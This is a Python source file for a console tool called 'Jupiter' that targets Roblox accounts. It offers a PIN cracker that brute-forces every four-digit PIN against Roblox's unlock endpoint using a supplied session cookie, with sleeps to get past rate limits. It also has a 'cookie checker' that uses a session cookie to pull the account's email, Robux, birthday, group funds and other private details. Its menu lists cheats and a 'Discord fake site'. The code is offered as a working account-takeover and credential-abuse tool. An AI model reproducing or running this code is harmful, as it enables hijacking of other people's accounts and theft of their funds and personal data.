# Closed for public untill its going free
#   ____.            .                  
#   |    | ________ ||/  |_  ___________ 
#   |    |  |  \____ \|  \   \/  \_   |
# /\|    |  |  /  |_> >    | \  ___/|  | \/
# \________|____/|   __/|__||__|  \___  >__|   
#                |__|                 \/                  
# Only for PC!

from pystyle import Colorate, Colors, Add, Center, Write
import os
import time
import requests
settingsAll = requests.get("https://raw.githubusercontent.com/VZXdev/Jupiter/refs/heads/main/license")


def getBanner():
  bannerText = """
"""
  
  bannerLogo = """
     ____.            .                  
    |    | ________ ||/  |_  ___________ 
    |    |  |  \____ \|  \   \/  \_   |
/\|    |  |  /  |_> >    | \  ___/|  | \/
\________|____/|   __/|__||__|  \___  >__|   
               |__|                 \/                  
"""

  banner = Colorate.Vertical(Colors.green_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
  return banner

def getChecker():
  bannerText = """
"""
  
  bannerLogo = """
     ____.            .__  __                
    |    |__ ________ |__|/  |_  ___________ 
    |    |  |  \____ \|  \   __\/ __ \_  __ |
/\__|    |  |  /  |_> >    | \  ___/|  | \/
\________|____/|   /||||  \___  >|   
               ||                 \/                
"""

  banner = Colorate.Vertical(Colors.green_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
  return banner

os.system("cls")
print('')
Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
print(getBanner())
import requests
import re
import string
import time
import os
from pystyle import Colorate, Colors, Add, Center, Write


year = time.localtime().tm_year
day = time.localtime().tm_mday
month = time.localtime().tm_mon
def getCracker():
  bannerText = f"""

     Very strong pin cracker
        Work on {day}.{month}.{year}
            press "Enter" to exit
                   [By JealLeal]
"""
  
  bannerLogo = """
       _             _ _            
      | |           (_) |           
      | |_   _ _   _| |_ ___ _  
  _   | | | | | '_ \| | / _ \ '|
 | || | |_| | |_) | | ||  / |   
  \____/ \,_| .__/|_|\__\___|_|   
              | |                   
              |_|                  
"""

  banner = Colorate.Vertical(Colors.green_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
  return banner


def Pin_Cracker():
    os.system("cls")
    print('')
    print(getCracker())
    print('')
    cookie = Write.Input('Enter your cookie below:', Colors.green, interval=0.0025)
    os.system("cls")
    print('')

    url = 'https://auth.roblox.com/v1/account/pin/unlock'
    token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
    xcrsf = (token.headers['x-csrf-token'])
    header = {'X-CSRF-TOKEN': xcrsf}

    i = 0

    for i in range(9999):
        try:
            pin = str(i).zfill(4)
            payload = {'pin': pin}
            r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
            if 'unlockedUntil' in r.text:
                print(f'Pin Cracked! Pin: {pin}')
            
            elif 'Too many requests made' in r.text:
                
                print('  Ratelimited, trying again in 60 seconds..')
                time.sleep(60)
                
            elif 'Authorization' in r.text:
                
                print('  Error! Is the cookie valid?')
                break
            
            elif 'Incorrect' in r.text:
                print(f"  Tried: {pin} , Incorrect!")
                time.sleep(10)  
            elif 'MethodNotAllowed' in r.text:
                Write.Print('Method Not Allowed. Sorry we cant do anything\n', Colors.green, interval=0.0025)
        except:
            print('  Error!')
def GetNumber():
    if settingsAll.text == "true":
        print("yes")
    a = 1
    Number = Write.Input("[1] Cheats (Kefir sploit);\n[2] Cookie checker;\n[3] Discord fake site;\n[4] Roblox Pin cracker;\n Write number (1, 2, 3, 4): ", Colors.green, interval=0.0025)
    if Number == "1":
        Write.Print("Waiting for open file...\n", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        dol = 0
        while dol != 10:
            Write.Print("[Error] accets not downloaded. Redownload files in 2 sec...\n", Colors.red, interval=0.0025)
            time.sleep(2)
            Write.Print("[Error] Waiting for open file...\n", Colors.red, interval=0.0025)
            dol +=1
        a = 0
        os.system("cls")
        print('')
        print(getBanner())
        GetNumber()
        Write.Print("[Error] ATTENTION! YOUR DEVICE DOES NOT SUPPORT KEFIRSPLOIT! PLEASE GO TO UBANTU!\n", Colors.red, interval=0.0025)
    elif Number == "2":
        Write.Print("Waiting for open file... \n", Colors.green_to_blue, interval=0.0025)
        a = 0
        time.sleep(2)
        os.system("cls")
        print('')
        Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
        print(getChecker())
        cookie = Write.Input(f"Cookie to check: ", Colors.green_to_cyan, interval=0.0025)
        check(cookie)
    elif Number == "3":
        Write.Print("Our servers off, please wait\n", Colors.green_to_blue, interval=0.0025)
        a = 0
        time.sleep(2)
        os.system("cls")
        print('')
        print(getBanner())
        GetNumber()
    elif Number == "4":
        Write.Print("Waiting for open file... \n", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        Pin_Cracker()
        a = 0


def check(cookie):

  Emmail = requests.get('https://accountsettings.roblox.com/v1/email', cookies={'.ROBLOSECURITY': str(cookie)}).json()
  email = Emmail['verified']
  EmailName = Emmail['emailAddress']
  Write.Print(f"[Process] Get email...\n", Colors.orange, interval=0.0025)
  credit = requests.get("https://billing.roblox.com/v1/credit", cookies={'.ROBLOSECURITY': str(cookie)}).json()['balance']
  Write.Print(f"[Process] Get credit...\n", Colors.orange, interval=0.0025)
  userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()
  birthday = requests.get("https://accountinformation.roblox.com/v1/birthdate", cookies={'.ROBLOSECURITY': str(cookie)}).json()
  Write.Print(f"[Process] Get birthday...\n", Colors.orange, interval=0.0025)
  followers = requests.get("https://friends.roblox.com/v1/users/418307011/followers/count", cookies={'.ROBLOSECURITY': str(cookie)}).json()['count']
  Write.Print(f"[Process] Get followers...\n", Colors.orange, interval=0.0025)
  userid = userdata['id']
  Write.Print(f"[Process] Get userId...\n", Colors.orange, interval=0.0025)
  transactions = requests.get(f"https://economy.roblox.com/v2/users/{userid}/transaction-totals?timeFrame=Month&transactionType=summary", cookies={'.ROBLOSECURITY': str(cookie)}, data={'timeFrame':'Month', 'transactionType': 'summary'}).json()
  pending = transactions['pendingRobuxTotal']
  Write.Print(f"[Process] Get Pending...\n", Colors.orange, interval=0.0025)
  stipends = transactions['premiumStipendsTotal']
  Write.Print(f"[Process] Get stipends...\n", Colors.orange, interval=0.0025)
  devEx = transactions['developerExchangeTotal']
  Write.Print(f"[Process] Get DevEX...\n", Colors.orange, interval=0.0025)
  groups = requests.get(f"https://groups.roblox.com/v1/users/{userid}/groups/roles", cookies={'.ROBLOSECURITY': str(cookie)})
  groupIds = [i['group']['id'] for i in groups.json()['data'] if i['group']['owner']['userId'] == userid]
  groupFunds = 0
  for i in groupIds:
    groupFunds += int(requests.get(f"https://economy.roblox.com/v1/groups/{i}/currency", cookies={'.ROBLOSECURITY': str(cookie)}).json()['robux'])


  creationDate = requests.get(f'https://users.roblox.com/v1/users/{userid}').json()['created']
  display = userdata['displayName']
  Write.Print(f"[Process] Get Display...\n", Colors.orange, interval=0.0025)
  username = userdata['name']
  Write.Print(f"[Process] Get Username...\n", Colors.orange, interval=0.0025)
  robuxdata = requests.get(f'https://economy.roblox.com/v1/users/{userid}/currency',cookies={".ROBLOSECURITY":cookie}).json() 
  robux = robuxdata['robux']
  Write.Print(f"[Process] Get Robux...\n", Colors.orange, interval=0.0025)
  premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie}).json()
  rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
  while rap_dict['nextPageCursor'] != None:
      rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
  rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])
  birthdate = f'{birthday["birthMonth"]}/{birthday["birthDay"]}/{birthday["birthYear"]}'
  thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
  image_url = thumbnail["data"][0]["imageUrl"]
  pindata = requests.get('https://auth.roblox.com/v1/account/pin',cookies={".ROBLOSECURITY":cookie}).json() 
  pin_bool = pindata["isEnabled"]
  Write.Print(f"Username: {username}, url= https://roblox.com/users/{userid}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Display name: {display}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"User ID: {userid}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Robux: {robux}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Has pin: {pin_bool}\n", Colors.green_to_cyan, interval=0.0025)
  if pin_bool == True:
    Write.Print(f"[advice]: Use Jupiter pin cracker!\n", Colors.orange, interval=0.0025)
  Write.Print(f"Display name: {display}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Premium: {premiumbool}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Credit: {credit}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Birthday: {birthdate}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Groups: {groupIds}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Rap: {rap}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Is email verified: {email}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Email: {EmailName}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"group founds: {groupFunds}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Dev exchange: {devEx}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Pending: {pending}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Premium Stipends: {stipends}\n", Colors.green_to_cyan, interval=0.0025)
  Write.Print(f"Followers: {followers}\n", Colors.green_to_cyan, interval=0.0025)
  cookie = Write.Input(f"Press any key to exit", Colors.orange, interval=0.0025)
  #dualhook

def login():
    Write.Print("Please login... \n", Colors.green_to_blue, interval=0.0025)
    User = Write.Input("Username: ", Colors.green_to_blue, interval=0.0025)
    Pas = Write.Input("Password: ", Colors.green_to_blue, interval=0.0025)
    if User == "FREE" and Pas == "FREE":
        Write.Print("Successful login!", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        os.system("cls")
        print('')
        Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
        print(getBanner())
        GetNumber()
    elif User == "Guest" and Pas == "123":
        Write.Print("Successful login!", Colors.green_to_blue, interval=0.0025)
        time.sleep(2)
        os.system("cls")
        print('')
        print(getBanner())
        Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
        GetNumber()
    else:
        Write.Print("Incorrect login or password!", Colors.green_to_blue, interval=0.0025)
        time.sleep(3)
        os.system("cls")
        print('')
        print(getBanner())
        login()
login()
